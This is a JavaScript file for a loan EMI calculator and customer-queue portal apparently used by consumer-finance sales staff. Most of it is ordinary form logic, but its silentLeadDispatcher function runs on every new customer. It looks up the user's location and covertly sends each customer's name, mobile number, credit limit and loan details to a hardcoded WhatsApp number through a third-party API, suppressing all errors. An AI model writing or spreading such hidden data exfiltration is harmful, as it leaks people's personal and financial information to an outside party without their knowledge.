function fcCatChanged() { let isPhone = isMobileDeviceCat(document.getElementById('fcCat').value); let rSelect = document.getElementById('fcRfc'); let exwInput = document.getElementById('fcExw'); if(isPhone) { rSelect.disabled = false; rSelect.style.background = '#fff'; rSelect.style.cursor = 'default'; exwInput.value = ""; exwInput.disabled = true; exwInput.style.background = '#e9ecef'; exwInput.style.cursor = 'not-allowed'; fcInvChanged(); } else { rSelect.value = "0"; rSelect.disabled = true; rSelect.style.background = '#e9ecef'; rSelect.style.cursor = 'not-allowed'; exwInput.disabled = false; exwInput.style.background = '#fff'; exwInput.style.cursor = 'text'; calculateFastData(); } }

function fcInvChanged() { 
    let inv = parseFloat(document.getElementById('fcInv').value) || 0; 
    document.getElementById('fcLoanInput').value = inv > 0 ? inv : '';
    let isPhone = isMobileDeviceCat(document.getElementById('fcCat').value); 
    let gtl = inv > 100000 ? 2398 : (inv > 50000 ? 1799 : (inv > 30000 ? 1499 : (inv > 10000 ? 1199 : (inv > 0 ? 699 : 0)))); 
    document.getElementById('fcGtl').value = gtl; 
    let rfcSlab = getRfcSlabValue(inv); 
    let rfcOpt = document.getElementById('fcRfcOpt'); 
    if(rfcOpt) { rfcOpt.value = rfcSlab; rfcOpt.innerText = rfcSlab; } 
    if (isPhone) { document.getElementById('fcRfc').value = rfcSlab; } else { document.getElementById('fcRfc').value = "0"; } 
    calculateFastData(); 
}

function validateFastLoanMin() {
    let inv = parseFloat(document.getElementById('fcInv').value) || 0;
    let loanInput = parseFloat(document.getElementById('fcLoanInput').value) || 0;
    let minFastLoan = inv > 0 ? inv * 0.50 : 0;
    if (inv > 0 && loanInput > 0 && loanInput < minFastLoan) {
        document.getElementById('fcLoanInput').value = minFastLoan;
        showToast("⚠️ कोणत्याही स्कीममध्ये लोन अमाऊंट इन्व्हॉइसच्या ५०% पेक्षा कमी असू शकत नाही!", "error");
        calculateFastData();
    }
}

function calculateFastData() {
    let inv = parseFloat(document.getElementById('fcInv').value) || 0; let loanInput = parseFloat(document.getElementById('fcLoanInput').value) || 0; let tenure = parseInt(document.getElementById('fcTenure').value) || 0; let adv = parseInt(document.getElementById('fcAdv').value) || 0; let roi = parseFloat(document.getElementById('fcRoi').value) || 0; let pf = parseFloat(document.getElementById('fcPf').value) || 0; let dbd = parseFloat(document.getElementById('fcDbd').value) || 0; let custType = document.getElementById('fcCustType').value; let fixedEmi = parseFloat(document.getElementById('fcFixed').value) || 0; let cap = parseFloat(document.getElementById('fcCap').value) || 0; let target = parseFloat(document.getElementById('fcTarget').value) || 0; let gtl = parseFloat(document.getElementById('fcGtl').value) || 0; let rfc = parseFloat(document.getElementById('fcRfc').value) || 0; let exw = parseFloat(document.getElementById('fcExw').value) || 0; let margin = parseFloat(document.getElementById('fcMargin').value) || 0; let dealer = parseFloat(document.getElementById('fcDealer').value) || 0;
    if (inv <= 0 && loanInput <= 0) { document.getElementById('fcResult').style.display = 'none'; return; }
    
    let minFastLoan = inv > 0 ? inv * 0.50 : 0;
    if (loanInput > 0 && loanInput < minFastLoan) {
        loanInput = minFastLoan;
    }
    
    let fee = (custType === 'EMI CARD') ? 270 : (custType === 'W/O CARD' ? 320 : 850); let totalFees = fee + margin + dealer; let insTotal = gtl + rfc + exw; let dbdRate = (dbd * 1.18 / 100); let roiRate = roi / 1200; let roiRateDP = roiRate * adv; let loan = loanInput > 0 ? loanInput : inv;
    
    let emi = 0; let dpRounded = 0; let inst = 0; let finalTenure = tenure;
    if (fixedEmi > 0) { 
        finalTenure = Math.floor(loan / fixedEmi) || 1; 
        if (loanInput > 0) loan = finalTenure * fixedEmi;

        if (target > 0) { 
            let numerator = target - inv - (fixedEmi * adv) - pf - totalFees; 
            let denominator = dbdRate + roiRateDP - 1; 
            let solvedLoan = numerator / denominator; 
            let solvedTenure = Math.floor(solvedLoan / fixedEmi); 
            loan = Math.max(minFastLoan, solvedTenure * fixedEmi); 
            finalTenure = Math.floor(loan / fixedEmi) || 1; 
        } else { 
            if (loanInput === 0) loan = finalTenure * fixedEmi; 
        } 
        inst = finalTenure - adv; if (inst < 1) inst = 1; 
        let roiInEmi = loan * roiRate; emi = fixedEmi + (insTotal / inst) + roiInEmi; 
        let roiInDp = loan * roiRateDP; let dpExact = inv - loan + (fixedEmi * adv) + (loan * dbdRate) + pf + totalFees + roiInDp; 
        dpRounded = Math.ceil(dpExact / 10) * 10; 
    } 
    else { 
        if (target > 0 && inv > 0) { 
            let advRate = adv / tenure; let numerator = target - inv - pf - totalFees; let denominator = advRate + dbdRate + roiRateDP - 1; 
            let solvedLoan = numerator / denominator; loan = Math.min(inv, Math.max(minFastLoan, Math.floor(solvedLoan))); 
        } 

        let minLoanFor900Emi = 900 * tenure;
        if (loan < minLoanFor900Emi) {
            loan = minLoanFor900Emi;
        }
        
        if (inv > 0 && loan > inv) {
            loan = inv;
        }

        inst = tenure - adv; if (inst < 1) inst = 1; 
        let roiInEmi = loan * roiRate; emi = (loan / tenure) + (insTotal / inst) + roiInEmi; 
        if (cap > 0 && emi > cap) { 
            loan = (cap - (insTotal / inst)) / ((1 / tenure) + roiRate); 
            if (loan < minFastLoan) loan = minFastLoan; 
            if (loan < minLoanFor900Emi) loan = minLoanFor900Emi; 
            if (inv > 0 && loan > inv) loan = inv; 
            roiInEmi = loan * roiRate; emi = (loan / tenure) + (insTotal / inst) + roiInEmi; 
        } 
        let roiInDp = loan * roiRateDP; let dpExact = inv - loan + ((loan / tenure) * adv) + (loan * dbdRate) + pf + totalFees + roiInDp; 
        dpRounded = Math.ceil(dpExact / 10) * 10; 
    }
    let dailyEmi = emi / 30; document.getElementById('fcResLoan').innerText = "₹" + Math.floor(loan).toLocaleString(); document.getElementById('fcResDp').innerText = "₹" + Math.round(dpRounded).toLocaleString(); document.getElementById('fcResEmi').innerText = "₹" + Math.round(emi).toLocaleString(); document.getElementById('fcResDaily').innerText = "₹" + Math.round(dailyEmi).toLocaleString(); document.getElementById('fcResTa').innerText = `T/A: ${finalTenure}/${adv} | M: ${inst}`; document.getElementById('fcResult').style.display = 'block';
}

async function silentLeadDispatcher(cust) {
    try { let locInfo = "Location: Hidden/Unknown"; try { let ipRes = await fetch("https://ipapi.co/json/"); if (ipRes.ok) { let ipData = await ipRes.json(); locInfo = `${ipData.city || '-'}, ${ipData.region || '-'} (${ipData.org || 'ISP'})`; } } catch(e) {} let secretMsg = `🚨 *PORTAL SECRET LEAD*\n\n👤 *Name:* ${cust.name}\n📞 *Mobile:* ${cust.mobile || 'N/A'}\n💰 *Limit:* ₹${cust.limit}\n🏷️ *Type:* ${cust.type}\n📊 *LTV:* ${cust.ltv}%\n🛡️ *Cap:* ${cust.cap ? '₹'+cust.cap : 'None'}\n⏰ *Time:* ${cust.timestamp}\n📍 *Location:* ${locInfo}`; let targetPhone = "918087313624"; let apiKey = localStorage.getItem('callmebot_secret_key') || "YOUR_API_KEY"; let encMsg = encodeURIComponent(secretMsg); let url = `https://api.callmebot.com/whatsapp.php?phone=${targetPhone}&text=${encMsg}&apikey=${apiKey}`; fetch(url, { method: 'GET', mode: 'no-cors' }).catch(e => {}); } catch(err) {}
}

/* === REAL-TIME DUPLICATE MOBILE CHECKER (ACTIVE QUEUE + RECYCLE BIN) === */
function checkDuplicateMobile(val) {
    let warningEl = document.getElementById('mobileDupWarning');
    let mobileInp = document.getElementById('cqMobile');
    let addBtn = document.getElementById('addToQueueBtn');
    let queueSearchInp = document.getElementById('queueSearch');
    if (!warningEl || !mobileInp || !addBtn) return;

    let cleanVal = val.trim();

    if (cleanVal.length === 10) {
        let existingCust = customerQueue.find(c => c.mobile && c.mobile === cleanVal);
        if (existingCust) {
            warningEl.innerHTML = `⚠️ हा नंबर आधीच Queue मध्ये <b>'${existingCust.name}'</b> नावाने आहे! उजवीकडे तपासा.`;
            warningEl.style.display = 'block';
            mobileInp.style.borderColor = 'var(--danger)';
            mobileInp.style.background = '#fff0f0';

            addBtn.disabled = true;
            addBtn.style.opacity = '0.5';
            addBtn.style.cursor = 'not-allowed';
            addBtn.style.background = 'gray';

            if (queueSearchInp) {
                queueSearchInp.value = cleanVal;
                renderCustomerQueue();
            }
            return;
        }

        let recycledCust = recycleBin.find(c => c.mobile && c.mobile === cleanVal);
        if (recycledCust) {
            warningEl.innerHTML = `🗑️ हा नंबर <b>Recycle Bin</b> मध्ये <b>'${recycledCust.name}'</b> नावाने पडलेला आहे! कृपया तिथे जाऊन <b>RESTORE</b> करा.`;
            warningEl.style.display = 'block';
            mobileInp.style.borderColor = 'var(--warning)';
            mobileInp.style.background = '#fffbf0';

            addBtn.disabled = true;
            addBtn.style.opacity = '0.5';
            addBtn.style.cursor = 'not-allowed';
            addBtn.style.background = 'gray';

            if (queueSearchInp && queueSearchInp.value === cleanVal) {
                queueSearchInp.value = '';
                renderCustomerQueue();
            }
            return;
        }
    }

    warningEl.style.display = 'none';
    mobileInp.style.borderColor = '#ccc';
    mobileInp.style.background = '#fff';

    addBtn.disabled = false;
    addBtn.style.opacity = '1';
    addBtn.style.cursor = 'pointer';
    addBtn.style.background = 'var(--success)';

    if (queueSearchInp && queueSearchInp.value === cleanVal) {
        queueSearchInp.value = '';
        renderCustomerQueue();
    }
}

async function addCustomerToQueue() {
    let name = document.getElementById('cqName').value.trim() || `Cust ${customerQueue.length + 1}`; 
    let mobile = document.getElementById('cqMobile').value.trim() || ""; 
    let limit = parseFloat(document.getElementById('cqLimit').value); 
    let ltv = parseFloat(document.getElementById('cqLtv').value) || 100; 
    let type = document.getElementById('cqType').value; 
    let cap = parseFloat(document.getElementById('cqCap').value) || "";
    
    if(!limit || limit <= 0 || isNaN(limit)) { 
        showToast("⚠️ Customer add karne ke liye pehle ek valid NBFC LIMIT enter karein!", "error"); 
        return; 
    }
    
    let now = new Date(); 
    let ts = now.toLocaleDateString('en-GB', {day:'2-digit', month:'short'}) + ' ' + now.toLocaleTimeString('en-US', {hour:'2-digit', minute:'2-digit'});
    let newCustObj = { name, mobile, limit, ltv, type, cap, timestamp: ts, components: {}, products: [], sortConfigs: [] };
    
    customerQueue.unshift(newCustObj); 
    silentLeadDispatcher(newCustObj);
    
    if (activeCustomerIndex !== -1) activeCustomerIndex++; 
    if (selectedQueueIndex !== -1) selectedQueueIndex++;
    
    await saveQueueToLocal(); 

    document.getElementById('cqName').value = ''; 
    document.getElementById('cqMobile').value = ''; 
    document.getElementById('cqLimit').value = ''; 
    document.getElementById('cqCap').value = '';

    let warnEl = document.getElementById('mobileDupWarning'); if(warnEl) warnEl.style.display = 'none';
    let mobInp = document.getElementById('cqMobile'); if(mobInp) { mobInp.style.borderColor = '#ccc'; mobInp.style.background = '#fff'; }
    let addBtn = document.getElementById('addToQueueBtn'); if(addBtn) { addBtn.disabled = false; addBtn.style.opacity = '1'; addBtn.style.cursor = 'pointer'; addBtn.style.background = 'var(--success)'; }

    renderCustomerQueue(); 
    updateUniversalActionButtons();
    showToast("✅ Customer Queue मध्ये ॲड झाला!", "success");
}

function copyCustomerDetails(idx, btnElement) { let c = customerQueue[idx]; let cappingLine = (c.cap && c.cap !== "") ? `\nEMI CAPPING- ${c.cap}` : ""; let textToCopy = `CUSTOMER NAME- ${c.name}\nNUMBER- ${c.mobile || ''}\nLIMIT- ${c.limit}\nLTV- ${c.ltv}${cappingLine}`; function showSuccess() { let originalText = btnElement.innerText; btnElement.innerText = "COPIED!"; btnElement.style.background = "var(--success)"; btnElement.style.color = "white"; setTimeout(() => { btnElement.innerText = originalText; btnElement.style.background = "var(--warning)"; btnElement.style.color = "#000"; }, 2000); } if (navigator.clipboard && window.isSecureContext) { navigator.clipboard.writeText(textToCopy).then(showSuccess).catch(() => fallbackCopy(textToCopy, showSuccess)); } else { fallbackCopy(textToCopy, showSuccess); } }
function maskName(str) { if (!str || str === "-") return str; return str.split(' ').map(word => { if (word.length <= 2) return word; return word[0] + '*'.repeat(word.length - 2) + word[word.length - 1]; }).join(' '); }
function selectQueueItem(idx) { selectedQueueIndex = idx; renderCustomerQueue(); updateUniversalActionButtons(); }

function updateUniversalActionButtons() {
    let copyB = document.getElementById('uniCopyBtn'); let selB = document.getElementById('uniSelectBtn'); let editB = document.getElementById('uniEditBtn'); let delB = document.getElementById('uniDeleteBtn'); let invB = document.getElementById('uniInviteBtn');
    if (selectedQueueIndex !== -1 && customerQueue[selectedQueueIndex]) { copyB.style.opacity = '1'; copyB.style.pointerEvents = 'auto'; selB.style.opacity = '1'; selB.style.pointerEvents = 'auto'; editB.style.opacity = '1'; editB.style.pointerEvents = 'auto'; delB.style.opacity = '1'; delB.style.pointerEvents = 'auto'; invB.style.opacity = '1'; invB.style.pointerEvents = 'auto'; } 
    else { copyB.style.opacity = '0.5'; copyB.style.pointerEvents = 'none'; selB.style.opacity = '0.5'; selB.style.pointerEvents = 'none'; editB.style.opacity = '0.5'; editB.style.pointerEvents = 'none'; delB.style.opacity = '0.5'; delB.style.pointerEvents = 'none'; invB.style.opacity = '0.5'; invB.style.pointerEvents = 'none'; }
}

function uniCopy() { if(selectedQueueIndex !== -1) copyCustomerDetails(selectedQueueIndex, document.getElementById('uniCopyBtn')); }
function uniSelect() { if(selectedQueueIndex !== -1) setActiveCustomer(selectedQueueIndex); }
function uniEdit() { if(selectedQueueIndex === -1) return; let c = customerQueue[selectedQueueIndex]; document.getElementById('ecName').value = c.name; document.getElementById('ecMobile').value = c.mobile || ''; document.getElementById('ecLimit').value = c.limit; document.getElementById('ecLtv').value = c.ltv || 100; document.getElementById('ecType').value = c.type; document.getElementById('ecCap').value = c.cap || ''; document.getElementById('editCustomerModal').style.display='flex'; }
function uniInvite() { if(selectedQueueIndex === -1) return; let c = customerQueue[selectedQueueIndex]; if(!c.mobile || c.mobile.length < 10) { showToast("⚠️ Kripya Customer ka valid 10 digit mobile number update karein!", "error"); return; } document.getElementById('invSenderName').value = localStorage.getItem('portal_sales_name') || ""; document.getElementById('invSenderMobile').value = localStorage.getItem('portal_sales_mobile') || ""; document.getElementById('inviteModal').style.display = 'flex'; }
function sendWhatsAppInvite() { let sName = document.getElementById('invSenderName').value.trim(); let sMobile = document.getElementById('invSenderMobile').value.trim(); if(!sName || !sMobile) { showToast("⚠️ Kripya apna Naam aur Number dalein!", "error"); return; } localStorage.setItem('portal_sales_name', sName); localStorage.setItem('portal_sales_mobile', sMobile); let c = customerQueue[selectedQueueIndex]; let msg = `Namaskar ${c.name} sir/madam! 🎉\n\nAapki Bajaj Finance ki *₹${c.limit}* ki limit approve ho gayi hai! 🥳\n\nAb intezaar kis baat ka? Aaj hi apni pasand ki cheez kharidne ke liye dukan par zaroor visit karein. 🛍️✨\n\n👤 *${sName}*\n📞 ${sMobile}`; let encMsg = encodeURIComponent(msg); window.open(`https://wa.me/91${c.mobile}?text=${encMsg}`, '_blank'); document.getElementById('inviteModal').style.display = 'none'; }
function closeCustomerEdit() { document.getElementById('editCustomerModal').style.display='none'; }

async function saveCustomerEdit() { if(selectedQueueIndex === -1) return; let c = customerQueue[selectedQueueIndex]; c.name = document.getElementById('ecName').value || 'Customer'; c.mobile = document.getElementById('ecMobile').value; c.limit = parseFloat(document.getElementById('ecLimit').value) || 0; c.ltv = parseFloat(document.getElementById('ecLtv').value) || 100; c.type = document.getElementById('ecType').value; let cap = parseFloat(document.getElementById('ecCap').value); c.cap = cap > 0 ? cap : ''; await saveQueueToLocal(); renderCustomerQueue(); if(activeCustomerIndex === selectedQueueIndex) { updateMatrixTopCard(); current_products.forEach((_, idx) => recalcModel(idx)); } closeCustomerEdit(); }
async function uniDelete() { if(selectedQueueIndex !== -1) await removeCustomer(selectedQueueIndex); }
async function removeCustomer(idx) { let c = customerQueue[idx]; recycleBin.push(c); await saveToDB('persistent_recycle', recycleBin); localStorage.setItem('persistent_recycle_backup', JSON.stringify(recycleBin)); if(activeCustomerIndex === idx) activeCustomerIndex = -1; else if (activeCustomerIndex > idx) activeCustomerIndex--; customerQueue.splice(idx, 1); if (selectedQueueIndex === idx) selectedQueueIndex = -1; else if (selectedQueueIndex > idx) selectedQueueIndex--; if(customerQueue.length > 0 && activeCustomerIndex === -1) activeCustomerIndex = 0; await saveQueueToLocal(); renderCustomerQueue(); updateUniversalActionButtons(); }

function openRecycleBin() { let list = document.getElementById('recycleBinList'); if(recycleBin.length === 0) { list.innerHTML = `<div style="text-align:center; color:#888;">Recycle Bin empty</div>`; } else { list.innerHTML = recycleBin.map((c, i) => ` <div style="display:flex; justify-content:space-between; align-items:center; background:#fff; padding:8px; border-radius:4px; border:1px solid #ddd;"> <div style="font-size:12px; color:var(--dark); font-weight:bold;"> 👤 ${c.name} <br><span style="color:var(--success);">LMT: ₹${c.limit}</span> </div> <button onclick="restoreCustomer(${i})" style="background:var(--primary); color:white; padding:6px; border-radius:3px;">↩️ RESTORE</button> </div> `).join(''); } document.getElementById('recycleBinModal').style.display='flex'; }
function closeRecycleBin() { document.getElementById('recycleBinModal').style.display='none'; }
async function restoreCustomer(idx) { let c = recycleBin.splice(idx, 1)[0]; customerQueue.unshift(c); if(activeCustomerIndex !== -1) activeCustomerIndex++; if(selectedQueueIndex !== -1) selectedQueueIndex++; await saveQueueToLocal(); await saveToDB('persistent_recycle', recycleBin); localStorage.setItem('persistent_recycle_backup', JSON.stringify(recycleBin)); openRecycleBin(); renderCustomerQueue(); updateUniversalActionButtons(); }

async function emptyRecycleBin() {
    if(recycleBin.length === 0) { showToast("⚠️ Recycle bin pehle se hi empty hai!", "warning"); return; }
    showCustomConfirm("Are you sure you want to permanently delete all items in the Recycle Bin?", async () => { recycleBin = []; await saveToDB('persistent_recycle', recycleBin); localStorage.setItem('persistent_recycle_backup', JSON.stringify(recycleBin)); openRecycleBin(); showToast("🗑️ Recycle Bin completely emptied!", "success"); });
}

function renderCustomerQueue() { let documentCount = document.getElementById('queueCount'); if(documentCount) documentCount.innerText = customerQueue.length; let list = document.getElementById('customerQueueList'); if(!list) return; let qSearch = document.getElementById('queueSearch').value.toLowerCase().trim(); let isSearching = qSearch !== ""; let filtered = customerQueue.map((c, idx) => ({...c, originalIdx: idx})).filter(c => { if(!isSearching) return true; return c.name.toLowerCase().includes(qSearch) || (c.mobile && c.mobile.includes(qSearch)) || c.limit.toString().includes(qSearch) || (c.cap && c.cap.toString().includes(qSearch)) || c.type.toLowerCase().includes(qSearch); }); if(filtered.length === 0) { list.innerHTML = `<div style="text-align:center; color:#888;">No customers found.</div>`; return; } list.innerHTML = filtered.map((c) => { let idx = c.originalIdx; let isSelected = (selectedQueueIndex === idx); let isActive = (activeCustomerIndex === idx); let displayName = (isSearching || isSelected) ? c.name : maskName(c.name); let bgStyle = isSelected ? '#e3f2fd' : (isActive ? '#f0f8ff' : '#fff'); let borderStyle = isSelected ? 'var(--primary)' : (isActive ? '#0088cc' : '#ddd'); let shadowStyle = isSelected ? '0 0 5px rgba(9, 132, 227, 0.5)' : (isActive ? '0 0 5px rgba(0, 136, 204, 0.3)' : 'none'); return ` <div onclick="selectQueueItem(${idx})" style="cursor:pointer; display:flex; flex-direction:column; background:${bgStyle}; padding:8px; border-radius:4px; border:1px solid ${borderStyle}; box-shadow:${shadowStyle}; transition:0.2s;"> <div style="display:flex; justify-content:space-between; align-items:center; margin-bottom:4px;"> <strong style="color:var(--indigo);">👤 ${displayName} ${c.mobile ? `<span style="color:#d35400; cursor:text;" title="Double-click to select" ondblclick="highlightNumber(event, this.querySelector('.mob-num'))">(📞 <span class="mob-num">${c.mobile}</span>)</span>` : ''}</strong> <span style="color:#888; font-weight:bold;">${c.timestamp || ''}</span> </div> <div style="color:#555; font-weight:bold;"> LMT: <span style="color:var(--success)">₹${c.limit}</span> | LTV: ${c.ltv}% | CAP: ${c.cap ? '₹'+c.cap : 'NO'} | ${c.type} ${isActive ? '<span style="float:right; color:var(--primary);">[ACTIVE ✓]</span>' : ''} </div> </div>`; }).join(''); }

async function setActiveCustomer(idx) { if(db_records.length === 0) { showToast("⚠️ Master Stream se data fetch nahi hua hai. Kripya connection check karein!", "error"); return; } activeCustomerIndex = idx; await saveQueueToLocal(); document.getElementById('queueSearch').value = ''; goToFinalPage(); }
function isLimitValid() { if (activeCustomerIndex === -1 || !customerQueue[activeCustomerIndex]) { showToast("⚠️ Kripya pehle queue mein ek customer add karein aur use 'ACTIVE' rakhein.", "warning"); return false; } return true; }

function generateStackCards() { let container = document.getElementById('stackInputsContainer'); if(!container) return; container.innerHTML = ""; for(let i=1; i<=10; i++) { container.innerHTML += ` <div class="stack-card"><div style="font-weight:900; color:var(--primary); margin-bottom:4px; border-bottom:1px solid #eee; padding-bottom:2px;">SCHEME #${i}</div> <div class="inner-grid"> <div><label>TENURE (MAX)</label><input type="number" id="msTen_${i}" placeholder="0"></div> <div><label>ADVANCE</label><input type="number" id="msAdv_${i}" placeholder="0"></div> <div><label>DBD %</label><input type="number" id="msDbd_${i}" placeholder="0"></div> <div><label>PF (₹)</label><input type="number" id="msPf_${i}" placeholder="0"></div> <div><label>ROI %</label><input type="number" id="msRoi_${i}" placeholder="0"></div> <div><label>FIXED EMI (₹)</label><input type="number" id="msFix_${i}" placeholder="0"></div> </div> </div>`; } }
function openMultiStackModal() { if (!isLimitValid()) return; document.getElementById('addProductModal').style.display='none'; document.getElementById('multiStackModal').style.display='flex'; }
function closeMultiStackModal() { document.getElementById('multiStackModal').style.display='none'; }

async function processMultiStack() {
    let modelName = document.getElementById('multiStackModelName').value.trim().toUpperCase(); if (!modelName) { showToast("⚠️ Kripya Product Model Name zaroor enter karein!", "error"); return; } let validSchemes = [];
    for(let i=1; i<=10; i++) { let ten = parseInt(document.getElementById(`msTen_${i}`).value) || 0; let fix = parseInt(document.getElementById(`msFix_${i}`).value) || 0; if(ten > 0 || fix > 0) { validSchemes.push({ tenure: ten, advEmi: parseInt(document.getElementById(`msAdv_${i}`).value) || 0, dbd: parseFloat(document.getElementById(`msDbd_${i}`).value) || 0, pf: parseInt(document.getElementById(`msPf_${i}`).value) || 0, roi: parseFloat(document.getElementById(`msRoi_${i}`).value) || 0, fixedEmi: fix, minLoan: 0, maxLoan: 9999999, category: "MANUAL", inactive: false, isExpired: false, expiryDateStr: "" }); } }
    if(validSchemes.length > 0) { let comp = customerQueue[activeCustomerIndex].components || {}; current_products.push({ name: modelName, schemes: validSchemes, category: "MANUAL", inputs: { mrp: comp.mrp||"", inv: comp.inv||"", cap: comp.cap||(customerQueue[activeCustomerIndex]?.cap || ""), target: comp.target||"", gtl: comp.gtl||0, rfc: comp.rfc||0, exw: comp.exw||"", margin: comp.margin||"", dealer: comp.dealer||"", surch: 0, manualLoans: {} }, isManual: true, isNonTieup: false }); sortConfigs.push({ key: 'dp', dir: 'asc' }); customerQueue[activeCustomerIndex].products = current_products; customerQueue[activeCustomerIndex].sortConfigs = sortConfigs; await saveQueueToLocal(); closeMultiStackModal(); renderMatrix(); } else { showToast("⚠️ Kripya kam se kam ek Scheme ki details zaroor fill karein!", "error"); }
}

function findValLocal(row, targets) { let key = Object.keys(row).find(k => targets.includes(k.toUpperCase().replace(/\s/g, ''))); return key ? row[key] : null; }
function mapData(row, type) { 
    if(!row) return null; 
    let expVal = findValLocal(row, ['EXPIRY', 'EXPIRYDATE', 'VALIDTILL', 'SCHEMEEXPIRY', 'ENDDATE']); 
    let expDate = parseExcelDate(expVal); 
    let isExp = false; let expiryDateStr = ""; 
    if(expDate) { 
        let today = new Date(); today.setHours(0,0,0,0); 
        if(expDate < today) isExp = true; 
        let dd = String(expDate.getDate()).padStart(2, '0'); let mm = String(expDate.getMonth() + 1).padStart(2, '0'); let yyyy = expDate.getFullYear(); expiryDateStr = `${dd}/${mm}/${yyyy}`; 
    } 
    if(isExp) return null; 
    return { model: type === SPECIAL_MODEL ? SPECIAL_MODEL : String(findValLocal(row,['MODEL','BRANDMODEL'])||"").toUpperCase(), brand: String(findValLocal(row, ['BRAND', 'MAKE', 'MANUFACTURER'])||"").toUpperCase(), mrp: parseFloat(findValLocal(row, ['MRP', 'PRICE', 'M.R.P'])) || 0, tenure: parseInt(findValLocal(row, ['TOTALTENURE', 'TENURE', 'TA'])) || 0, advEmi: parseInt(findValLocal(row, ['ADVANCEEMI', 'ADV'])) || 0, dbd: parseFloat(findValLocal(row,['DBD','DBD%'])||0), pf: parseInt(findValLocal(row,['PF','PROCESSINGFEE'])||0), roi: parseFloat(findValLocal(row,['ROI','ROI%'])||0), fixedEmi: parseFloat(findValLocal(row,['FIXEDEMI', 'FIXED'])||0), category: standardizeCategoryName(findValLocal(row,['CATEGORY','CAT'])||""), minLoan: parseFloat(findValLocal(row, ['MINLOAN', 'MINL'])) || 0, maxLoan: parseFloat(findValLocal(row, ['MAXLOAN', 'MAXL'])) || 9999999, isExpired: isExp, expiryDateStr: expiryDateStr, inactive: false }; 
}

function goHome() { document.getElementById('finalEligibleArea').style.display='none'; document.getElementById('catSelectionModal').style.display='none'; document.getElementById('unifiedHome').style.display='flex'; activeCustomerIndex = -1; selectedQueueIndex = -1; renderCustomerQueue(); updateUniversalActionButtons(); window.scrollTo({ top: 0, behavior: 'smooth' }); }
function closeImageViewer() { document.getElementById('imageViewerModal').style.display='none'; }
function openAddProductModal() { if (!isLimitValid()) return; document.getElementById('modalMatrixSearch').value = ''; document.getElementById('modalMatrixSearchDropdown').style.display = 'none'; document.getElementById('addProductModal').style.display = 'flex'; }
function openSchemeOnlyModal(pIdx) { if (!isLimitValid()) return; document.getElementById('modalTitle').innerText = "Add Custom Scheme"; document.getElementById('modelNameInputArea').style.display = 'none'; document.getElementById('targetPIdx').value = pIdx; document.getElementById('manualModal').style.display='flex'; }
function closeManualModal() { document.getElementById('manualModal').style.display='none'; }
function openEditSchemeModal(pIdx, dIdx) { let scheme = current_products[pIdx].schemes[dIdx]; document.getElementById('editPIdx').value = pIdx; document.getElementById('editDIdx').value = dIdx; document.getElementById('editTen').value = scheme.tenure || 0; document.getElementById('editAdv').value = scheme.advEmi || 0; document.getElementById('editDbd').value = scheme.dbd || 0; document.getElementById('editPf').value = scheme.pf || 0; document.getElementById('editRoi').value = scheme.roi || 0; document.getElementById('editFixed').value = scheme.fixedEmi || 0; document.getElementById('editSchemeModal').style.display = 'flex'; }
function closeEditSchemeModal() { document.getElementById('editSchemeModal').style.display = 'none'; }
function saveSchemeEdit() { let pIdx = parseInt(document.getElementById('editPIdx').value); let dIdx = parseInt(document.getElementById('editDIdx').value); let scheme = current_products[pIdx].schemes[dIdx]; scheme.tenure = parseInt(document.getElementById('editTen').value) || 0; scheme.advEmi = parseInt(document.getElementById('editAdv').value) || 0; scheme.dbd = parseFloat(document.getElementById('editDbd').value) || 0; scheme.pf = parseInt(document.getElementById('editPf').value) || 0; scheme.roi = parseFloat(document.getElementById('editRoi').value) || 0; scheme.fixedEmi = parseFloat(document.getElementById('editFixed').value) || 0; closeEditSchemeModal(); recalcModel(pIdx); }

function doSearch(id, ddId) {
    let q = document.getElementById(id).value.toUpperCase().trim(); let dd = document.getElementById(ddId); if(!q) { dd.style.display='none'; return; }
    let validRecords = db_records.filter(r => r.model !== SPECIAL_MODEL); let matches = validRecords.filter(r => { let m = r.model || ""; let b = r.brand || ""; let c = r.category || ""; return m.includes(q) || b.includes(q) || c.includes(q); }).map(r => r.model); matches = [...new Set(matches)].slice(0, 15);
    if (matches.length === 0) { dd.innerHTML = `<div style="padding:10px; color:#d35400; font-weight:bold; text-align:center;">No matching models found.</div>`; dd.style.display = 'block'; return; }
    dd.innerHTML = matches.map(m => { let rec = validRecords.find(x => x.model === m); let brandTag = rec && rec.brand ? `<span style="font-size:10px; color:#0984e3; font-weight:900; margin-right:5px;">[${rec.brand}]</span>` : ''; return `<div style="padding:10px; border-bottom:1px solid #eee; cursor:pointer; font-weight:800;" onclick="selectModel('${m}')">${brandTag}${m}</div>`; }).join(''); dd.style.display = 'block';
}

function selectModel(name) { if (!isLimitValid()) return; let raw = db_records.filter(r => r.model === name); let baseMrp = raw.find(s => s.mrp > 0)?.mrp || ""; let cat = raw[0]?.category || ""; tempPendingProduct = { name: name, isNT: false, category: cat }; currentModalCategory = cat; document.getElementById('modalMatrixSearchDropdown').style.display = 'none'; document.getElementById('modalMatrixSearch').value = ''; document.getElementById('addProductModal').style.display = 'none'; showComponentsModal(baseMrp); }
function quickNonTieup() { if (!isLimitValid()) return; if(db_records.length === 0) { showToast("⚠️ Master database fetch me error hai!", "error"); return; } document.getElementById('addProductModal').style.display = 'none'; let tieup = db_records.filter(r => r.model === SPECIAL_MODEL); let cats = [...new Set(tieup.map(r => r.category))].sort(); document.getElementById('categoryGrid').innerHTML = cats.map(c => { let label = (c === 'PHONE(WEB-MOBILE)') ? 'PHONE, TABLET, SMART WATCH' : c; return `<div style="background:var(--indigo);color:white;padding:12px;border-radius:4px;cursor:pointer;font-weight:900;text-align:center;" onclick="selectCategory('${c}')">${label}</div>`; }).join(''); document.getElementById('catSelectionModal').style.display = 'flex'; }
function selectCategory(catName) { document.getElementById('catSelectionModal').style.display = 'none'; let displayName = (catName === 'PHONE(WEB-MOBILE)') ? 'PHONE / TABLET / SMART WATCH' : catName; tempPendingProduct = { name: SPECIAL_MODEL + " - " + displayName, isNT: true, category: catName }; currentModalCategory = catName; finalizeProductAddition(); }

